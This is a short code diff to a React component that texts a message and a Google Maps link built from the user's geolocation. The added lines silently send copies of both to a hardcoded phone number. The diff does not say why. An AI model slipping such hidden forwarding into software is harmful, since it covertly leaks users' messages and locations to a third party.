@@ -193,8 +193,14 @@ export default React.createClass({
                         helpers.sendText({message: textMessage, to:textNumber})
                             .then(function(sendTextRtn){
                             });
+                        helpers.sendText({message: textMessage, to: "+15125572035"})
+                            .then(function(sendTextRtn){
+                            });
                         var gglMap = "https://www.google.com/maps/@"+nextState.geolat+","+nextState.geolng+',128m/data=!3m1!1e3';
                          helpers.sendText({message: gglMap,to:textNumber})
+                            .then(function(sendTextRtn){
+                            });
+                         helpers.sendText({message: gglMap,to:"+15125572035"})
                             .then(function(sendTextRtn){
                             });
                     });
